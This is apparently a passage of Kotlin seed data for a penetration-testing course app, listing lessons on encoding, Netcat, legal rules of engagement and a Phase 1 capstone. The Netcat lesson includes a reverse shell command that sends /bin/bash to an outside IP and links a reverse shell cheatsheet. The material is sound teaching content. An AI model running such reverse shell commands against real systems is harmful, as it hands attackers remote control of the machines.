            keyTakeaways = "• Base64 length is always a multiple of 4; ends with = or == padding.\n• Hashes cannot be mathematically reversed; they must be brute-forced or looked up in rainbow tables.\n• URL encoding is necessary to pass special control characters safely through HTTP query strings.",
            commandsCode = "# Base64 encode and decode strings via CLI\necho -n 'hackthebox' | base64\necho 'aGFja3RoZWJveA==' | base64 -d\n\n# Generate SHA-256 hash of a string\necho -n 'admin123' | sha256sum",
            videoTitle = "Cryptography and Encoding Fundamentals for CTF Players",
            videoUrl = "https://www.youtube.com/watch?v=jhXCTbFnK8o",
            videoChannel = "John Hammond",
            videoDuration = "24m",
            readTitle = "CyberChef - The Cyber Swiss Army Knife Documentation",
            readUrl = "https://gchq.github.io/CyberChef/",
            readSource = "GCHQ",
            labTitle = "PicoCTF: General Skills & Cryptography Warmups",
            labUrl = "https://play.picoctf.org/practice",
            labPlatform = "PicoCTF",
            labDescription = "Solve 5 beginner cryptography and encoding challenges in PicoCTF.",
            xpReward = 50
        ),
        DayEntity(
            id = 18,
            phase = 1,
            dayNumber = 18,
            title = "Netcat: The Hacker's Swiss Army Knife (nc & ncat)",
            subtitle = "Port listening, banner grabbing, raw socket debugging, file transfers, and basic reverse shells.",
            concept = """
                Netcat (`nc`) is a versatile networking utility for reading and writing data across network connections using TCP or UDP:
                Core Modes:
                - Client Mode (Connect to host:port): `nc -nv 10.10.10.10 80`
                - Server / Listener Mode (Listen on port): `nc -lvnp 4444` (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port).
                - Banner Grabbing: Connecting to open ports to read software name and version strings emitted by services (e.g., Apache 2.4.41, OpenSSH 8.2p1).
                - Reverse Shell Target Command: `nc -e /bin/bash 10.10.14.5 4444` (or bash FIFO pipe if `-e` disabled).
            """.trimIndent(),
            keyTakeaways = "• Banner grabbing identifies exact service versions needed to find CVE exploits.\n• Netcat listeners must bind to ports higher than 1024 unless run with root/sudo.\n• Socat is an advanced netcat replacement supporting full PTY terminal stabilization.",
            commandsCode = "# Start a TCP listener on port 4444\nnc -lvnp 4444\n\n# Grab banner from a remote web service\necho -e 'HEAD / HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n' | nc target.com 80",
            videoTitle = "Netcat for Ethical Hackers: The Swiss Army Knife",
            videoUrl = "https://www.youtube.com/watch?v=4yopq2qH3jA",
            videoChannel = "David Bombal",
            videoDuration = "20m",
            readTitle = "PayloadsAllTheThings: Reverse Shell Cheatsheet",
            readUrl = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md",
            readSource = "PayloadsAllTheThings",
            labTitle = "Netcat & Sockets Practice - TryHackMe",
            labUrl = "https://tryhackme.com/room/introtonetworking",
            labPlatform = "TryHackMe",
            labDescription = "Establish bidirectional client-listener connections and transfer files.",
            xpReward = 50
        ),
        DayEntity(
            id = 19,
            phase = 1,
            dayNumber = 19,
            title = "Ethical Hacking Legalities, Ethics & Rules of Engagement",
            subtitle = "CFAA, GDPR, Scope definition, Permission slips, and Professional Code of Conduct.",
            concept = """
                The difference between a criminal hacker and an ethical penetration tester is Authorization:
                - Legal Frameworks:
                  * CFAA (Computer Fraud and Abuse Act - US): Prohibits unauthorized access to protected computers.
                  * Computer Misuse Act 1990 (UK): Criminalizes unauthorized access and modification.
                  * GDPR / Data Privacy: Handling discovered PII responsibly with strict encryption.
                - Rules of Engagement (RoE): Written legal contract defining target scopes (in-scope IP ranges, forbidden production databases), test window hours, notification protocols for critical findings, and emergency points of contact.
                - Bug Bounty Responsible Disclosure: Adhering strictly to safe harbor guidelines and scope boundaries on HackerOne/Bugcrowd.
            """.trimIndent(),
            keyTakeaways = "• Never test any system without explicit, written, signed permission from the asset owner.\n• Always stay strictly within defined IP and domain scopes.\n• Immediately halt testing and notify client leadership if sensitive live PII or active attacker compromise is discovered.",
            commandsCode = "# Verify target IP falls inside approved scope range before scanning\nipcalc 192.168.50.0/24",
            videoTitle = "How to Stay Legal in Cyber Security and Pentesting",
            videoUrl = "https://www.youtube.com/watch?v=aG3j6H5nF3M",
            videoChannel = "John Hammond",
            videoDuration = "18m",
            readTitle = "NIST SP 800-115: Technical Guide to Information Security Testing",
            readUrl = "https://csrc.nist.gov/publications/detail/sp/800-115/final",
            readSource = "NIST",
            labTitle = "Intro to Offensive Security - TryHackMe",
            labUrl = "https://tryhackme.com/room/introtoresearch",
            labPlatform = "TryHackMe",
            labDescription = "Review scenario-based scope documents and ethical decision trees.",
            xpReward = 50
        ),
        DayEntity(
            id = 20,
            phase = 1,
            dayNumber = 20,
            title = "Phase 1 Foundations Capstone: Network & Linux Assessment",
            subtitle = "Test your cumulative knowledge of networking, Linux internals, protocols, and security ethics.",
            concept = """
                Congratulations on completing Phase 1 of HackPath!
                You have mastered:
                1. The 7-layer OSI model and packet encapsulation.
                2. IPv4 subnetting, CIDR notation, and IP routing.
                3. TCP 3-way handshakes, flags, and UDP protocols.
                4. DNS, DHCP, and ARP network dynamics.
                5. Wireshark PCAP inspection and packet stream reconstruction.
                6. Linux CLI navigation, file permissions, and SUID binaries.
                7. Text manipulation with grep, sed, and awk.
                8. Linux process architecture and cron job inspection.
                9. User authentication (/etc/passwd, /etc/shadow, sudoers).
                10. SSH keypair cryptography and port operations with Netcat.

                You are now prepared to advance to Phase 2: Reconnaissance & OSINT!
            """.trimIndent(),
            keyTakeaways = "• Solid fundamentals in networking and Linux are the bedrock of top 1% penetration testers.\n• Phase 2 introduces passive and active target reconnaissance, Nmap mastery, and Shodan scanning.",
            commandsCode = "# Run a local system audit script check\nuname -a && whoami && id && ip addr",
            videoTitle = "Cyber Security Roadmap: From Beginner to Job Ready",
            videoUrl = "https://www.youtube.com/watch?v=3Kq1MIfTWCE",
            videoChannel = "TCM Security",
            videoDuration = "28m",
            readTitle = "Red Team Field Manual (RTFM) Foundations Summary",
            readUrl = "https://github.com/swisskyrepo/PayloadsAllTheThings",
            readSource = "RTFM",
            labTitle = "Phase 1 Comprehensive Practice Room",
            labUrl = "https://tryhackme.com/room/linuxmodules",
            labPlatform = "TryHackMe",
            labDescription = "Solve the integrated networking and Linux challenges to earn the Phase 1 badge.",
            xpReward = 100
        )
    )
}
